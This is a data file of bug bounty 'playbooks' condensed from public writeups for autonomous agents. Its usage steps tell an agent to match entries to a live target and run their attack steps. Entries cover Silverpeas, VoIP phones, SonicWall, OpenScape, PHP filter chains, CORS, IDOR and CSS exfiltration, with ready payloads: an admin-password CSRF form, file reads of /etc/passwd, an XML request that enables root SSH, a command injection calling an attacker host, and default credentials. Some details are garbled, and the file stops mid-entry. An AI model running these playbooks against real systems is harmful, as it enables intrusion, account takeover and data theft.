description: Agent-ready bug bounty playbooks extracted from writeups.json. Same schema as agent_playbooks_github.json — safe to merge.

usage.step_1: Load tactic_index.json and look up your target's technology under by_technology to get relevant playbook IDs.
usage.step_2: Filter by by_access_level matching your current access to the target.
usage.step_3: Prioritize IDs in high_confidence and quick_wins lists for best hit rate.
usage.step_4: Load matching playbooks from this file by their 'id' field.
usage.step_5: Check trigger_conditions.prerequisites and applicability_signals against the live target.
usage.step_6: If conditions match, run attack_playbook.recon_steps first, then attack_steps.
usage.step_7: Confirm with success_indicators. If failed, use failure_indicators to pivot.

meta.title: Silverpeas App: Multiple CVEs leading to File Read on Server

trigger_conditions.when_to_apply: When an authenticated user can send messages to administrators, and the application has insufficient XSS filtering.
prerequisites: The target application must be Silverpeas Core version 6.3.1 or earlier.
The attacker must have an authenticated user account.
applicability_signals: Presence of a 'Write to administrators' option in the user's personal workspace.
Ability to send messages that are viewed by administrators.
skip_if: All XSS attempts result in sanitization without execution.
Administrators do not view messages sent by regular users.

recon_steps: Step 1: Log in as a regular authenticated user and locate the 'Write to administrators' feature.
Step 2: Inspect the user interface and network requests to understand how messages are sent and displayed.
attack_steps: Step 1: Craft a malicious message containing a bypass for XSS filtering (e.g., using HTML tags other than <script>).
Step 2: Send the crafted message to administrators.
Step 3: Confirm XSS execution when an administrator views the message (e.g., via an alert box).
Step 4: If XSS is confirmed, craft a payload that leverages the administrative privileges to access the Crawler application for file reading.
Step 5: Execute the file reading payload using the Crawler application.
payloads_or_patterns: <body onload='document.forms[0].submit();'><form action='http://<TARGET_URL>/silverpeas/RjobDomainPeas/jsp/userModify' method='GET'><input type='hidden' name='action' value='changeAdmin'><input type='hidden' name='userId' value='1'><input type='hidden' name='userStatus' value='1'><input type='hidden' name='userMail' value='admin@localhost'><input type='hidden' name='userFirstname' value='admin'><input type='hidden' name='userLastname' value='admin'><input type='hidden' name='userLogin' value='admin'><input type='hidden' name='userPass' value='<NEW_ADMIN_PASSWORD>'><input type='hidden' name='userDomain' value='default'><input type='hidden' name='userGroup' value='administrator'></form></body>
<iframe src='http://<TARGET_URL>/silverpeas/GraphicalPortal/jsp/crawler.jsp?file=/etc/passwd'></iframe>
tools_recommended: Burp Suite: To intercept and modify HTTP requests, and to craft malicious payloads.
Browser Developer Tools: To inspect HTML, JavaScript, and network traffic.
success_indicators: An alert box pops up when an administrator views the message, indicating XSS execution.
Successful privilege escalation after sending the administrative payload.
The contents of sensitive files (e.g., /etc/passwd) are returned in the response when using the crawler with a file path.
failure_indicators: XSS payload is sanitized and no JavaScript executes (e.g., alert does not appear). Suggest trying different XSS bypass techniques.
Access denied or 404 when trying to use the crawler application. Suggest verifying the crawler endpoint and file paths.

playbooks.impact: An attacker can achieve privilege escalation to administrator level and then perform arbitrary file reads on the backend server, potentially exposing sensitive system information.
playbooks.key_lesson: Always test XSS filtering bypass techniques, especially when sensitive actions (like sending messages to admins) are involved, as these can lead to privilege escalation and further exploitation.

meta.title: How I got $300 for Default Credential Login at Bugcrowd 🎉

tech_stack_fingerprints: Shodan search results for open ports

trigger_conditions.when_to_apply: When a Shodan scan reveals an open port with a login panel on a target IP address, and standard vulnerability scanning tools like SQLMap fail to find exploitable flaws.
prerequisites: Target IP address discovered via Shodan or other recon methods.
An open port on the target that hosts a login panel.
applicability_signals: Presence of a login panel on a non-standard port (e.g., 8855).
Initial attempts with automated tools (like SQLMap) do not yield results.
skip_if: No login panel is found.
Automated credential stuffing or brute-force attempts are immediately successful or blocked by strong security measures.
The login panel requires multi-factor authentication that cannot be bypassed.

recon_steps: Step 1: Use Shodan to identify IP addresses associated with the target. Filter for open ports.
Step 2: Perform a port scan on identified IP addresses to discover accessible services and potential login panels. Note the URL and port (e.g., https://xx.xx.xx.xx:8855/site).
attack_steps: Step 1: Navigate to the identified login panel URL (e.g., https://<TARGET_IP>:8855/site).
Step 2: Attempt to log in using common default credentials, prioritizing 'admin/admin'.
Step 3: If 'admin/admin' grants access, escalate privileges and investigate further potential vulnerabilities.
payloads_or_patterns: Username: admin
Password: admin
tools_recommended: Shodan: For initial reconnaissance and port discovery.
Nmap: For detailed port scanning.
Web browser: For accessing and interacting with the login panel.
Burp Suite: To capture and analyze login requests if more advanced techniques are needed.
success_indicators: Successful login with default credentials (e.g., admin/admin) to the web application panel.
Access to administrative features or sensitive information after logging in.
failure_indicators: Login attempts with default credentials fail, showing 'Invalid username or password' or similar.
Brute-force protection or account lockout mechanisms are encountered.
The login panel redirects to an error page or requires further authentication.

playbooks.impact: Unauthorized access to the target application's administrative interface, potentially leading to data breaches, system compromise, or further exploitation.
playbooks.key_lesson: Always test common default credentials (e.g., admin/admin, root/password) on any discovered login panels, even if initial automated scans fail.

meta.title: Introducing Wrapwrap: Using PHP Filters To Wrap A File With A Prefix And Suffix

affected_components: File inclusion and parsing functions (e.g., file_get_contents, xml_parse_into_struct, json_decode) that process user-supplied URLs or file paths without proper validation or error checking.
tech_stack_fingerprints: Presence of PHP code that uses file_get_contents, xml_parser_create, xml_parse_into_struct, or json_decode on user-controlled input without sufficient sanitization.

trigger_conditions.when_to_apply: When a web application processes a user-supplied URL or file path using functions like `file_get_contents`, `xml_parse_into_struct`, or `json_decode` in a way that could lead to SSRF, and specifically when a prefix is needed to make the processed content valid for further parsing (e.g., XML or JSON).
prerequisites: The target application must be using PHP.
The application must be vulnerable to SSRF via file inclusion or parsing of user-controlled resources.
There must be a mechanism to inject data into a PHP filter chain.
applicability_signals: Endpoints that accept URLs or file paths as parameters.
Code that uses `file_get_contents` on user input.
Code that parses XML or JSON from user input without robust error handling.
The presence of the `php://filter` stream wrapper.
skip_if: The application explicitly validates and sanitizes all user-supplied URLs/file paths, rejecting any potentially malicious ones.
The application does not use PHP.
WAFs that block common PHP filter chain bypasses or SSRF payloads.

recon_steps: Identify endpoints that accept URLs or file paths as input parameters.
Analyze the PHP code for functions like `file_get_contents`, `xml_parse_into_struct`, `json_decode`, and check if they are used with user-controlled input without proper validation.
Look for instances where a specific format (like XML or JSON) is expected after fetching the resource, and where the parsing function's return code is not checked.
attack_steps: Step 1: Construct a payload using `php://filter` to prepend a specific string (e.g., '<product><name>') to the content of a target resource (e.g., '/etc/passwd'). This can be achieved using a chain of `convert.base64-encode` and other `iconv` filters to manipulate the data and then base64-decode it.
Step 2: Send the crafted URL containing the `php://filter` chain to the vulnerable endpoint. The prefix will be prepended to the fetched content.

Step 3: If the application then parses this prefixed content (e.g., as XML), and the parsing function (like `xml_parse_into_struct`) doesn't critically fail on malformed XML after the prefix, the content of the target resource will be exposed in the application's output, potentially prefixed as intended.
payloads_or_patterns: php://filter/convert.base64-encode|...|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16|convert.iconv.WINDOWS-1258.UTF32LE|convert.iconv.ISIRI3342.ISO-IR-157|convert.base64-decode|.../resource=/etc/passwd

The `php_filter_chain_generator.py` script mentioned in the writeup can be used to generate complex filter chains with prefixes. The general structure involves: `php://filter/<prefix_generation_chain>/resource=<target_resource>` where `<prefix_generation_chain>` is a series of filters designed to inject the desired prefix, often involving base64 encoding/decoding and charset conversions.
tools_recommended: Burp Suite to intercept and modify requests.
A Python script (like the one mentioned, `php_filter_chain_generator.py`) to construct the complex `php://filter` chains.
success_indicators: The application's response contains the expected prefix followed by the content of the targeted resource (e.g., '<product><name>root:x:0:0:root:/root:/bin/bash...' for /etc/passwd).
The SSRF target resource (e.g., an internal IP address) is successfully accessed and its content is revealed.
failure_indicators: The application returns an error indicating malformed input or XML/JSON.
The response does not contain the expected prefix or the content of the targeted resource.
A 403 Forbidden or similar error is returned, indicating WAF blocking. In this case, consider using obfuscated filter chains or alternative SSRF vectors.

playbooks.impact: Attacker can read arbitrary local files (e.g., /etc/passwd, configuration files) or access internal network resources that are normally not exposed externally. This can lead to information disclosure, further exploitation, or denial of service.
playbooks.key_lesson: When a PHP application parses user-supplied resources as structured data (XML, JSON) without checking parsing errors, investigate the possibility of using `php://filter` chains to prepend data, turning SSRF into an in-band data exfiltration vulnerability.

meta.title: Remote code execution and elevation of local privileges in Mitel Unify OpenStage and OpenScape VoIP phones

target_profile.technology: Mitel Unify OpenStage / OpenScape VoIP phones
tech_stack_fingerprints: phones respond on TCP port 8085 for WPI
phones respond on TCP port 80/443 for WBM

trigger_conditions.when_to_apply: When a network-local attacker has access to devices running unhardened default configurations of Mitel Unify OpenStage or OpenScape VoIP phones.
prerequisites: Attacker must be on the same network as the target phone.
applicability_signals: Work Point Interface (WPI) is accessible on TCP port 8085.
The phone's default configuration is in use (no hardening applied to WPI or DLS/DLI).
skip_if: WPI is disabled or requires authentication.
Deployment Service (DLS/DLI) has been hardened and verifies connections.

recon_steps: Step 1: Identify target VoIP phones on the local network using network scanning tools (e.g., Nmap) and check for open TCP port 8085 (WPI) and 80/443 (WBM).
Step 2: Attempt to access the WPI interface by sending an HTTP GET or POST request to <TARGET_IP>:8085. Look for XML message exchanges or a specific WPI response indicating it's listening.
attack_steps: Step 1: Craft an XML message for the Work Point Interface (WPI) to enable Secure Shell (SSH) and set a new administrator password. This message will be sent via HTTP POST to http://<TARGET_IP>:8085/.
Step 2: Send the crafted XML payload to the WPI.

Step 3: After successfully enabling SSH and setting the password, attempt to connect to the phone via SSH using the newly set administrator credentials to `root` or `admin` user at `ssh <ADMIN_USER>@<TARGET_IP>`.
payloads_or_patterns:
POST / HTTP/1.1
Host: <TARGET_IP>:8085
Content-Type: text/xml
Content-Length: <LENGTH>

<?xml version="1.0" encoding="UTF-8"?><config><setparam><name>sshd.enable</name><value>1</value></setparam><setparam><name>admin.password</name><value>NEW_STRONG_PASSWORD</value></setparam></config>
tools_recommended: Nmap: For network scanning to find open ports (8085, 80, 443).
curl: To send crafted HTTP POST requests with XML payloads.
Netcat (nc) or socat: To establish SSH connections.
Wireshark: For analyzing network traffic and understanding WPI communication.
success_indicators: Receiving an HTTP 200 OK response to the XML payload request from the WPI.
Successfully establishing an SSH connection to the phone using the attacker-defined administrator password.
failure_indicators: Receiving an HTTP error code (e.g., 400, 404, 500) for the XML payload.
SSH connection attempts are refused or fail with incorrect password errors.
WPI is not accessible or returns an unexpected response indicating it's not the target service.

playbooks.impact: Attacker gains remote code execution on the VoIP phone by enabling SSH and can then perform further actions such as wiretapping calls, accessing microphones for room surveillance, or using the phone as a pivot point within the network. Elevated privileges allow full control over the device.
playbooks.key_lesson: Always verify authentication and authorization mechanisms for management interfaces, especially on IoT devices that might have insecure defaults accessible over the network.

meta.title: CORS Misconfiguration -> PII Leak

trigger_conditions.when_to_apply: When a web application's API endpoint, intended for authenticated users to update their profile, is configured with permissive CORS policies, allowing an attacker-controlled origin to receive sensitive user data.
prerequisites: Attacker must have an authenticated user session.
applicability_signals: API response for profile update contains `Access-Control-Allow-Origin` header with a specific origin (e.g., `https://devportal.redacted.com`).
API endpoint accepts PATCH or similar methods for profile updates.
skip_if: CORS policy strictly enforces only the legitimate origin and does not allow any wildcard or attacker-controlled origins.
API endpoints do not expose PII in the response body for profile updates.

recon_steps: Intercept traffic during user profile updates to identify the API endpoint and check the `Access-Control-Allow-Origin` header in the response.
Observe the request method (e.g., PATCH) and the URL of the profile update endpoint.
attack_steps: Modify the intercepted request to change the `Origin` header to an attacker-controlled domain (e.g., `https://attacker-controlled.com`).
Change the request method to `GET` if the original method was not GET, to test if the server still responds.
Send the modified request to the target server.
Serve an HTML page from the attacker-controlled domain that includes JavaScript to make a cross-origin request to the target API.
The JavaScript should attempt to fetch user profile data. If the CORS policy is misconfigured, the browser will allow the response to be read by the JavaScript.
The JavaScript should then send the leaked PII to a server controlled by the attacker.
payloads_or_patterns:
CORS PoC by Boogsta

Please press below the button below to connect your accont to our service!

POST /api/v1/users/me HTTP/1.1
Host: <TARGET_HOST>
Origin: https://attacker-controlled.com
Content-Type: application/json
...
{"some_field": "some_value"}

GET <TARGET_URL>/api/v1/users/me HTTP/1.1
Host: <TARGET_HOST>
Origin: https://attacker-controlled.com
...
tools_recommended: Burp Suite: To intercept and modify requests, especially changing the `Origin` header and request method.
Local web server (e.g., Python http.server): To host the PoC HTML file on an attacker-controlled domain.
Browser Developer Tools: To inspect requests and responses, and to manually test `Origin` header manipulation.
success_indicators: The `Access-Control-Allow-Origin` header in the response from the target server reflects the attacker-controlled origin (`https://attacker-controlled.com`).
The JavaScript on the attacker's page successfully receives and processes the response containing sensitive PII (e.g., username, email, other user details).
The attacker's server receives the PII data sent from the victim's browser.
failure_indicators: The server responds with a 403 Forbidden or CORS-related error when the `Origin` header is changed to an unauthorized domain.
The `Access-Control-Allow-Origin` header is missing or remains set to a strict origin that does not include the attacker's domain.
The browser's developer console shows a CORS error (e.g., 'Access to fetch at ... from origin ... has been blocked by CORS policy').

playbooks.impact: An attacker can gain unauthorized access to sensitive Personally Identifiable Information (PII) of authenticated users by tricking their browser into making a request to the vulnerable API. This PII can then be exfiltrated and used for various malicious purposes, such as identity theft, targeted phishing attacks, or account takeover.
playbooks.key_lesson: Always configure CORS policies to strictly allow only trusted origins, and avoid overly permissive configurations that could lead to PII leaks or other sensitive data exposure.

meta.title: How i got $15000 Reward by Apple - Information Disclosure

tech_stack_fingerprints: custom subdomain, lack of specific framework fingerprints

trigger_conditions.when_to_apply: When authenticated to a specific Apple subdomain tool and observing API endpoints that use numeric identifiers.
prerequisites: Attacker must have an authenticated session to the target tool.
applicability_signals: Observation of API endpoints that accept numeric IDs.
The tool is used by Apple and its customers.
skip_if: No numeric ID parameters are observed in API requests.
Authentication to the tool is not possible.

recon_steps: Step 1: Browse Apple subdomains to identify potential tools or applications used by Apple and its customers.
Step 2: Authenticate to the identified tool and use browser developer tools to monitor network traffic, specifically looking for API calls.
attack_steps: Step 1: Identify API endpoints that accept a numeric ID parameter.
Step 2: For an authenticated user's request, intercept the request and modify the numeric ID to a different value (e.g., increment/decrement, or try common IDs).
Step 3: Observe the response for any leaked information belonging to other users.
Step 4: If successful, systematically enumerate numeric IDs to retrieve as much customer data as possible.
payloads_or_patterns: GET /api/resource?id=<NEW_NUMERIC_ID>
tools_recommended: Burp Suite: Intercept and modify requests, observe responses.
Browser Developer Tools: Monitor network traffic and identify API endpoints.
success_indicators: Response contains Personally Identifiable Information (PII) such as email addresses of other users, e.g., @apple.com, @bbc.com.
Response status code is 200 OK, and the response body contains data that does not belong to the authenticated user.
failure_indicators: Receiving a 403 Forbidden or 404 Not Found for changed IDs, suggesting access control or invalid IDs. Pivot: Try fuzzing for ID formats (UUIDs, etc.) or other parameters.
Responses consistently return data belonging to the authenticated user for all tested IDs, indicating no IDOR vulnerability.

playbooks.impact: Disclosure of a large volume of customer email addresses, potentially including internal Apple employees and external customers (e.g., @bbc.com). This can lead to phishing, targeted attacks, account takeovers, and reputational damage.
playbooks.key_lesson: When interacting with web applications, always inspect API requests for parameters that represent identifiers (especially numeric ones) and test for insecure direct object references (IDOR) by substituting identifiers belonging to other users or predictable sequences.

meta.title: SonicWall WXA – Authentication Bypass and Remote Code Execution Vulnerability
meta.category: Authentication bypass, Hardcoded credentials, RCE, Argument injection, Security code review

trigger_conditions.when_to_apply: When the target is a SonicWall WXA appliance and the dispatcher web service is accessible.
prerequisites: Attacker can reach the dispatcher web service on port 54321/TCP.
applicability_signals: Target is a SonicWall WXA appliance.
Dispatcher service listening on port 54321/TCP.
skip_if: Dispatcher service is not accessible or not running.
The hardcoded secret key cannot be identified or is regularly rotated.

recon_steps: Step 1: Identify SonicWall WXA appliances on the network and confirm the dispatcher service is running on port 54321/TCP.
Step 2: Reverse engineer the dispatcher service to extract the hardcoded secret key.
attack_steps: Step 1: Authenticate to the dispatcher web service using the recovered hardcoded secret key. (Specific endpoint and authentication mechanism not fully detailed in writeup).
Step 2: Identify and invoke an endpoint that allows argument injection when the `wget` command is used. Craft a payload to write an arbitrary file as root.
Step 3: Override the `dig` binary at `/usr/bin/dig` with a malicious payload (e.g., a shell script that executes commands).
Step 4: Invoke a separate endpoint that shells out to the `dig` command to achieve arbitrary code execution as root.
payloads_or_patterns: Hardcoded secret key (recovered via reverse engineering)
Argument injection payload for `wget` to write arbitrary files (e.g., `/usr/bin/dig`)
Malicious content for `/usr/bin/dig` that executes commands
tools_recommended: Reverse engineering tools (e.g., Ghidra, IDA Pro) to analyze the dispatcher service.
Network scanner (e.g., Nmap) to identify open ports.
Proxy tool (e.g., Burp Suite) to intercept and manipulate requests to the dispatcher service.
success_indicators: Successful authentication to the dispatcher service.
Arbitrary file write confirmed (e.g., the overwritten `dig` binary exists).
Remote code execution confirmed by observing shell commands executed on the target or by receiving a callback from the executed command.
failure_indicators: Inability to authenticate to the dispatcher service → focus on recovering the secret key or explore other potential authentication bypass methods.
Argument injection fails → investigate if input sanitization is present or if a different injection vector exists.
Overwriting `/usr/bin/dig` does not lead to RCE → verify the `dig` command is indeed invoked by another endpoint and try different payloads for the `dig` binary.

playbooks.impact: Arbitrary code execution as the root user, allowing complete compromise of the SonicWall WXA appliance.
playbooks.key_lesson: Always scrutinize authentication mechanisms, especially those using hardcoded secrets, and investigate endpoints that invoke system commands with user-controlled arguments for potential injection vulnerabilities.

meta.title: Tricks for Reliable Split-Second DNS Rebinding in Chrome and Safari

tech_stack_fingerprints: User Agent strings indicating Chrome, Safari, or Edge
Browser behavior related to DNS resolution and network requests

trigger_conditions.when_to_apply: This technique is applicable when targeting web applications that might be used in headless browser scenarios or when a user's browser is tricked into visiting a malicious site. It is particularly effective when the target system relies on DNS resolution for internal network access and when IPv6 is available.
prerequisites: Attacker controls a DNS server capable of rapid DNS record changes.
Attacker controls a web server to host the initial malicious page.
Target environment uses IPv6 (for some techniques).
applicability_signals: Ability to control DNS records for a domain.
The target application is observed to make network requests based on DNS lookups.
Browser's fetch API is used in a context that could be exploited.
Existence of headless browser instances driven by web applications.
skip_if: Target environment strictly enforces DNSSEC for all resolutions.
Target network has aggressive DNS caching that cannot be overcome.
Browser or WAF implements robust defenses against rapid DNS record changes.
The fetch API is explicitly configured to disallow requests to local network IPs.
IPv6 is disabled on the target network and browsers.

recon_steps: Step 1: Identify a domain that can be controlled by the attacker and is resolvable by the target's network.
Step 2: Observe network requests made by the target application or user's browser to understand its DNS resolution behavior.
attack_steps: Step 1: Configure attacker-controlled DNS server to serve a public IP address for a controlled domain initially.
Step 2: Host a malicious JavaScript page on a web server at the public IP.
Step 3: Instruct the target (via social engineering or exploiting another vulnerability) to visit a URL pointing to the controlled domain (e.g., <attacker_controlled_domain>).
Step 4: Immediately after the initial DNS lookup, reconfigure the attacker-controlled DNS server to serve a private/internal IP address for the same controlled domain.
Step 5: The browser, having the same origin as the malicious page, will now be able to send requests to the internal IP address.
Step 6 (for fetch API bypass): If targeting Chromium-based browsers, use the JavaScript to send requests to local network addresses via the fetch API, bypassing typical restrictions.
payloads_or_patterns: Initial DNS response: A record pointing to <attacker_public_ip>
Subsequent DNS response: A record pointing to <target_internal_ip>
JavaScript payload on attacker server: Example to fetch from internal IP: `fetch('http://<target_internal_ip>/admin')`
For fetch API bypass: JavaScript payload might involve specific timing or structure to trick the browser's network stack.
tools_recommended: Custom DNS server (e.g., dnsmasq with scripting, PowerDNS with scripting) for rapid record changes.
Web server (e.g., Nginx, Apache) to host malicious JavaScript.
Browser developer tools to observe network requests and DNS resolution.
Burp Suite or similar proxy to monitor traffic.
success_indicators: Successful requests to internal network resources from the victim's browser under the same origin as the malicious page.
Observable data leakage from internal services.
Execution of actions on internal services that require authentication or are otherwise restricted.
For fetch API bypass: Successful requests to localhost or internal IPs that would normally be blocked.
failure_indicators: Browser continues to resolve to the public IP after rapid changes (indicates caching or DNS propagation delays).
Requests to the internal IP result in connection refused or timed out (indicates the internal IP is incorrect or unreachable).
Browser returns CORS errors or network errors indicating the request was blocked (indicates fetch API restrictions are not bypassed).
WAF or IDS alerts indicating suspicious DNS activity or network requests.
Suggest trying alternative techniques if DNS caching is too aggressive or if IPv6 is not available.

playbooks.impact: Allows an attacker to bypass Same-Origin Policy restrictions and make requests from a victim's browser to internal network resources, potentially leading to data exfiltration, unauthorized actions on internal services, or further exploitation of internal systems.
playbooks.key_lesson: When targeting web applications that might involve headless browsers or user-initiated web visits, be aware of DNS rebinding as a technique to access internal network resources, especially when IPv6 is available. Test for rapid DNS record changes and exploit browser's network request behaviors.

meta.title: Writing Burp Bambda Filters Like a Boss

target_profile.technology: SaaS product (undocumented API endpoints on staging)
affected_components: API endpoints with modified Authorization headers

trigger_conditions.when_to_apply: When encountering API endpoints that use JWTs with non-standard signing algorithms (e.g., HS512 when the expected is HS256).
prerequisites: Access to Burp Suite version 2023.10.3 or later
Authenticated access to the target application's API
applicability_signals: Presence of 'Authorization: Bearer' headers in API requests
Observation of JWT tokens in Authorization headers
Identification of APIs using different JWT signing algorithms than the norm (e.g., HS512 instead of HS256)
skip_if: No 'Authorization: Bearer' headers are present
All observed JWT tokens use the expected signing algorithm

recon_steps: Step 1: Browse API traffic in Burp Suite Proxy history to identify requests containing 'Authorization: Bearer <JWT_token>' headers.
Step 2: Analyze the structure of observed JWT tokens to determine the signing algorithm (e.g., HS256, HS512) by decoding the token header.
attack_steps: Step 1: Navigate to the Burp Suite Proxy HTTP history tab and click on the 'Filter' option.
Step 2: Select 'Bambda mode' and paste the provided Bambda script into the Java snippet editor.
Step 3: Configure the filter to display requests that match the Bambda script's conditions (i.e., JWTs signed with HS512).
Step 4: Review the filtered requests to identify any new or unusual API endpoints using the non-standard algorithm.
Step 5: Further investigate the identified endpoints for potential vulnerabilities, such as token exchange services or authorization bypasses.
tools_recommended: Burp Suite (version 2023.10.3+)
Burp Bambda filters (Proxy HTTP history custom filters)
success_indicators: The Bambda filter successfully isolates requests containing JWTs signed with HS512.
Discovery of new, undocumented API endpoints.
Identification of a token exchange service with a vulnerability.
Successful exploitation of a vulnerability found through the Bambda filter.
failure_indicators: The Bambda filter returns no results, indicating no JWTs with HS512 are present.
No new or interesting endpoints are discovered after applying the filter.
Investigation of filtered endpoints does not reveal any vulnerabilities.

playbooks.impact: Discovery of new API endpoints, identification of vulnerabilities in token exchange services, leading to potential authorization bypasses and unauthorized access to data or functionality.
playbooks.key_lesson: Leverage Burp Suite's Bambda filters to create custom logic for identifying specific patterns in API requests, such as non-standard JWT signing algorithms, to uncover hidden API endpoints and potential vulnerabilities.

meta.title: Analyzing the SonicWall Custom Grub LUKS Encryption Modifications

target_profile.required_access_level: physical access to appliance or VM image

trigger_conditions.when_to_apply: When attempting to reverse engineer the SonicWall NSv appliance and encountering LUKS encrypted partitions with custom modifications that prevent standard decryption methods.
prerequisites: Access to a virtual machine image or physical appliance of SonicWall NSv.
applicability_signals: LUKS encrypted partitions encountered during analysis.
Standard LUKS decryption tools fail or require a key that is not readily available.
Appliance management user has restricted shell access.
skip_if: The LUKS encryption is not present or is standard and can be decrypted with default tools.
Full shell access is available to the management user.

recon_steps: Step 1: Obtain a virtual machine image or physical dump of the SonicWall NSv appliance.
Step 2: Attempt to identify LUKS encrypted partitions within the disk image.
Step 3: Verify if standard LUKS decryption methods (e.g., using a known password or passphrase) are ineffective.
attack_steps: Step 1: Use Qemu with GDB for dynamic analysis and debugging of the LUKS decryption process within the appliance's boot or recovery environment.
Step 2: Analyze the modifications made to the GRUB LUKS module to understand the custom key-derivation algorithm.
Step 3: Develop a utility (e.g., sonicwall-nsv-decrypter) to calculate the decryption key based on the LUKS header.
Step 4: Use the calculated decryption key with standard LUKS utilities (e.g., cryptsetup) to decrypt the partition.
Step 5: Mount the decrypted partition to access the core filesystem and application code for further reverse engineering.
payloads_or_patterns: Requires custom key derivation logic based on LUKS header, specific payload not universally applicable.
tools_recommended: Qemu: for virtualization and dynamic analysis.
GDB: for debugging.
cryptsetup: for LUKS volume management.
Custom utility (e.g., sonicwall-nsv-decrypter): to calculate the decryption key.
success_indicators: Successful decryption of the LUKS partition using the derived key.
Access to the root filesystem and application binaries.
failure_indicators: Inability to derive a valid decryption key even after analyzing the custom algorithm.
Persistent encryption preventing filesystem access.
Suggestion: If key derivation fails, investigate other potential bypasses or vulnerabilities in the boot process.

playbooks.impact: Gain full access to the SonicWall NSv appliance's filesystem and application binaries, enabling in-depth reverse engineering to identify potential vulnerabilities such as remote code execution.
playbooks.key_lesson: When encountering custom encryption on embedded devices or appliances, analyze the bootloader and encryption modules for custom key derivation algorithms that can be reverse engineered.

meta.title: Blind CSS Exfiltration: exfiltrate unknown web pages
meta.category: Blind CSS exfiltration, Blind HTML injection

tech_stack_fingerprints: CSP does not block injected styles
DOMPurify or similar sanitizers are not fully effective against injected styles

trigger_conditions.when_to_apply: When blind HTML injection is possible, JavaScript is blocked by CSP or filters, but CSS injection is permitted, and the attacker needs to exfiltrate data from the page.
prerequisites: Ability to inject HTML and CSS into a web page
A mechanism to trigger external requests (e.g., Burp Collaborator, OAST)
JavaScript is non-functional for data exfiltration
applicability_signals: Successful injection of `@import` rule to Burp Collaborator
Response to injected CSS does not trigger XSS but confirms injection point
`style` tags or attributes can be injected and rendered
skip_if: CSP strictly forbids all external resource loading
All attempts to inject CSS result in malformed styles or are stripped by sanitizers
JavaScript can be executed and used for exfiltration

recon_steps: Step 1: Attempt to inject a style tag with an `@import` rule pointing to a Burp Collaborator or other OAST domain. e.g., `<style>@import '//YOUR-PAYLOAD.oastify.com'</style>`
Step 2: Observe Burp Collaborator for an incoming request to confirm successful injection and OAST interaction.
attack_steps: Step 1: Inject a style block containing a CSS variable that conditionally loads a resource based on an attribute selector. e.g., `<input value='1337'> <style> input[value='1337'] { --value: url(/collectData?value=1337); } input { background:var(--value,none); } </style>`
Step 2: Modify the attribute selector and value to attempt to match specific characters or patterns within form elements or anchor tags.
Step 3: Use Burp Collaborator to capture requests triggered by the `url()` function within the CSS variable, which will contain the exfiltrated data.
Step 4: For more complex exfiltration, explore using the `:has()` pseudo-class (if supported by the target's browser) for more advanced pattern matching on parent elements.
payloads_or_patterns: <style>@import '//<COLLABORATOR_SUBDOMAIN>.oastify.com'</style>
<style> input[value='<CHAR_OR_PATTERN>'] { --data: url(/collect?val=<CHAR_OR_PATTERN>); } input { background:var(--data,none); } </style>
<style> a[href*='<CHAR_OR_PATTERN>'] { --data: url(/collect?val=<CHAR_OR_PATTERN>); } a { background:var(--data,none); } </style>
tools_recommended: Burp Suite Collaborator (or other OAST service) for receiving exfiltrated data
Burp Suite Repeater for manual testing and payload construction
success_indicators: Burp Collaborator receives requests with specific data embedded in the URL path (e.g., `/collect?val=a`, `/collect?val=123`)
Confirmation of character-by-character or pattern-based data exfiltration
failure_indicators: No interactions observed in Burp Collaborator after injecting CSS payloads
Injected CSS is rendered but does not trigger any external requests
403 Forbidden or other error responses when attempting to inject styles.

playbooks.impact: Exfiltration of sensitive data from web pages, including form inputs, anchor tag attributes (like href), and potentially other element properties, leading to information disclosure.
playbooks.key_lesson: When JavaScript is disabled or filtered, but CSS injection is possible, leverage CSS variables and attribute selectors to trigger OAST requests and exfiltrate data blindly.

meta.title: Argument injection vulnerability in multiple Atos Unify OpenScape products

target_profile.technology: Atos Unify OpenScape Session Border Controller (SBC), Branch, BCF
tech_stack_fingerprints: HTTP responses from the administrative web interface of OpenScape SBC/Branch/BCF

trigger_conditions.when_to_apply: When the administrative web interface of Atos Unify OpenScape products is accessible and the target version is vulnerable.
prerequisites: The target system must be running a vulnerable version of Atos Unify OpenScape SBC, Branch, or BCF.
Access to the administrative web interface login page.
applicability_signals: The target is an Atos Unify OpenScape product (SBC, Branch, BCF).
The product version is prior to the fixed versions (OpenScape SBC before V10 R3.4.0, OpenScape Branch before V10 R3.4.0, OpenScape BCF V10 before V10R10.12.00 and V10R11.05.02).
skip_if: The target system is running a patched version.
The administrative web interface is inaccessible.

recon_steps: Step 1: Identify the target product as Atos Unify OpenScape SBC, Branch, or BCF via banner grabbing or product-specific response patterns.
Step 2: Determine the version of the target product from the administrative interface or HTTP headers to check against known vulnerable versions.
attack_steps: Step 1: Send a POST request to the login endpoint (e.g., /srv/www/htdocs/auth.php) with the username parameter set to an argument injection payload designed to achieve RCE via SSH.
Step 2: If RCE is achieved, use the SSH root access to further compromise the system.
Step 3: Alternatively, send a POST request to the login endpoint with a specially crafted username and/or password to bypass authentication and log in as an administrator.
Step 4: Verify successful login to the administrative interface without valid credentials.
payloads_or_patterns: Username: `assistant` or `cdr` followed by shell command injection (e.g., `admin; ssh root@<ATTACKER_IP> 'id'` for RCE, or specific arguments for authentication bypass)
Refer to the writeup's 'Proof of concept' section for precise argument injection payloads.
tools_recommended: Burp Suite: To intercept and modify HTTP POST requests to the login endpoint.
curl: For scripting and sending crafted HTTP requests.
success_indicators: Successful SSH connection to the target appliance as the root user.
Response from the web interface indicating successful login as an administrative user without providing valid credentials.
Execution of commands on the target system via SSH.
failure_indicators: Login attempts result in error messages indicating invalid credentials or failed authentication.
No shell access is gained.
The system does not respond to crafted login attempts.
Consider checking if the target version is patched. If so, the vulnerability will not be present.

playbooks.impact: Unauthenticated attacker can gain root access to the appliance via SSH, leading to Remote Code Execution (RCE). Additionally, authentication can be bypassed, allowing access to the administrative interface as an arbitrary administrator user.
playbooks.key_lesson: Always test login forms and authentication mechanisms for argument injection vulnerabilities, especially when user-supplied input is passed to system commands or external executables without proper sanitization.

meta.title: Multiple Vulnerabilities In Extreme Networks ExtremeXOS
meta.category: Arbitrary file read, Privilege escalation, CSRF, RCE, Arbitrary file write
meta.vuln_type: LFI | Privilege Escalation | CSRF | RCE | Arbitrary File Write

tech_stack_fingerprints: CherryPy web framework (inferred from Python code analysis)

trigger_conditions.when_to_apply: When the target is an Extreme Networks switch running a vulnerable version of EXOS and the Chalet web administration interface is accessible.
prerequisites: Target device is running a vulnerable version of Extreme Networks EXOS.
The Chalet web administration interface is accessible.
applicability_signals: Presence of the Chalet web application.
Discovery of the `/terminal` endpoint.
